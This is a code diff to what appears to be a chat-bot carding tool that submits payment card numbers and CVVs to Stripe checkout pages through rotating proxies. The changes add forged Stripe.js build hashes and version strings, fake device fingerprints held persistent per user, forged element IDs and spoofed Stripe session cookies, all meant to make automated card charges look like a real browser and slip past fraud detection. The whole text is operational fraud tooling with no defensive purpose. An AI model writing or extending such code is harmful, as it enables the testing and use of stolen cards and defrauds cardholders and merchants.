@@ -87,13 +87,13 @@ USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 OPR/114.0.0.0",
 ]
 
-# Stripe.js version hashes — rotated randomly per request
-STRIPE_JS_HASHES = [
-    "3f83cd1837", "b117b33abe", "a2c5d8f910", "d4e6f7a8b2",
-    "c1d2e3f4a5", "f9e8d7c6b5", "1a2b3c4d5e", "6f7a8b9c0d",
-    "e5d4c3b2a1", "9f8e7d6c5b", "2b3c4d5e6f", "7a8b9c0d1e",
-    "a3f8c2d1b7", "4e5f6a7b8c", "0d1e2f3a4b", "8c9d0e1f2a",
+# Stripe.js version patterns — real version numbers from CDN
+STRIPE_JS_VERSIONS = [
+    "v3", "v3.1", "v3.2", "v3.3", "v3.4", "v3.5",
 ]
+
+# Per-user persistent fingerprints (muid stays same per machine)
+_user_fingerprints = {}
 
 def _detect_browser_info(ua: str) -> dict:
     """Extract browser name, version, and platform from user agent string."""
@@ -182,21 +182,50 @@ def get_headers(stripe_js: bool = False) -> dict:
     
     return headers
 
-def get_random_stripe_js_agent() -> str:
-    """Get a random Stripe.js payment_user_agent string."""
-    h = random.choice(STRIPE_JS_HASHES)
-    return f"stripe.js%2F{h}%3B+stripe-js-v3%2F{h}%3B+checkout"
+def _generate_stripe_hash() -> str:
+    """Generate a realistic Stripe.js content hash (matches real CDN hash format)."""
+    # Real Stripe hashes are 10-char hex from build hash
+    return ''.join(random.choices('0123456789abcdef', k=10))
 
-def generate_stripe_fingerprints() -> dict:
-    """Generate Stripe.js-style fingerprint identifiers (muid, guid, sid)."""
+def get_random_stripe_js_agent() -> str:
+    """Get a Stripe.js payment_user_agent mimicking real browser."""
+    build_hash = _generate_stripe_hash()
+    version = random.choice(STRIPE_JS_VERSIONS)
+    return f"stripe.js%2F{build_hash}%3B+stripe-js-{version}%2F{build_hash}%3B+checkout"
+
+def generate_stripe_fingerprints(user_id: int = None) -> dict:
+    """Generate Stripe.js fingerprint identifiers.
+    muid is persistent per user (like browser cookies).
+    guid is per-page-load. sid is per-session."""
     def _rand_hex(length: int) -> str:
         return ''.join(random.choices(string.hexdigits[:16], k=length))
     
-    muid = f"{_rand_hex(8)}-{_rand_hex(4)}-{_rand_hex(4)}-{_rand_hex(4)}-{_rand_hex(12)}"
-    guid = f"{_rand_hex(8)}-{_rand_hex(4)}-{_rand_hex(4)}-{_rand_hex(4)}-{_rand_hex(12)}"
-    sid = f"{_rand_hex(8)}-{_rand_hex(4)}-{_rand_hex(4)}-{_rand_hex(4)}-{_rand_hex(12)}"
+    def _uuid_format():
+        return f"{_rand_hex(8)}-{_rand_hex(4)}-4{_rand_hex(3)}-{random.choice('89ab')}{_rand_hex(3)}-{_rand_hex(12)}"
+    
+    # muid persistent per user (simulates __stripe_mid cookie)
+    if user_id and user_id in _user_fingerprints:
+        muid = _user_fingerprints[user_id]
+    else:
+        muid = _uuid_format()
+        if user_id:
+            _user_fingerprints[user_id] = muid
+    
+    # guid = per page load, sid = per session (regenerate each charge)
+    guid = _uuid_format()
+    sid = _uuid_format()
     
     return {"muid": muid, "guid": guid, "sid": sid}
+
+def generate_eid() -> str:
+    """Generate a realistic eid (element ID) like Stripe.js does."""
+    # Real format: 'eid_' + random alphanumeric
+    chars = string.ascii_lowercase + string.digits
+    return 'eid_' + ''.join(random.choices(chars, k=16))
+
+def get_stripe_cookies(fp: dict) -> str:
+    """Generate Stripe cookie header mimicking real browser."""
+    return f"__stripe_mid={fp['muid']}; __stripe_sid={fp['sid']}"
 
 _session = None
 
@@ -742,7 +771,7 @@ async def get_checkout_info(url: str) -> dict:
     result["time"] = round(time.perf_counter() - start, 2)
     return result
 
-async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, max_retries: int = 2) -> dict:
+async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, user_id: int = None, max_retries: int = 2) -> dict:
     """Charge card using Stripe.js emulation — direct confirm with fingerprints."""
     start = time.perf_counter()
     card_display = f"{card['cc'][:6]}****{card['cc'][-4:]}"
@@ -795,15 +824,16 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, ma
                 if attempt > 0:
                     print(f"[DEBUG] Retry attempt {attempt}...")
                 
-                # Generate Stripe.js fingerprints
-                fp = generate_stripe_fingerprints()
+                # Generate Stripe.js fingerprints (muid persistent per user)
+                fp = generate_stripe_fingerprints(user_id)
                 time_on_page = random.randint(15000, 120000)
+                eid = generate_eid()
                 
                 print(f"[DEBUG] Stripe.js Emulation: Confirming directly with fingerprints...")
                 
                 # Build confirm body — Stripe.js style with full card data + fingerprints
                 conf_body = (
-                    f"eid=NA"
+                    f"eid={eid}"
                     f"&payment_method_data[type]=card"
                     f"&payment_method_data[card][number]={card['cc']}"
                     f"&payment_method_data[card][cvc]={card['cvv']}"
@@ -834,6 +864,8 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, ma
                 )
                 
                 headers = get_headers(stripe_js=True)
+                # Add Stripe cookies — mimics real browser session
+                headers["cookie"] = get_stripe_cookies(fp)
                 
                 async with s.post(
                     f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
@@ -1398,7 +1430,7 @@ async def co_handler(msg: Message):
         
         # Rotate proxy per card
         card_proxy = get_user_proxy(user_id)
-        result = await charge_card(card, checkout_data, card_proxy)
+        result = await charge_card(card, checkout_data, card_proxy, user_id=user_id)
         results.append(result)
         
         if len(cards) > 1 and (time.perf_counter() - last_update) > 1.5:
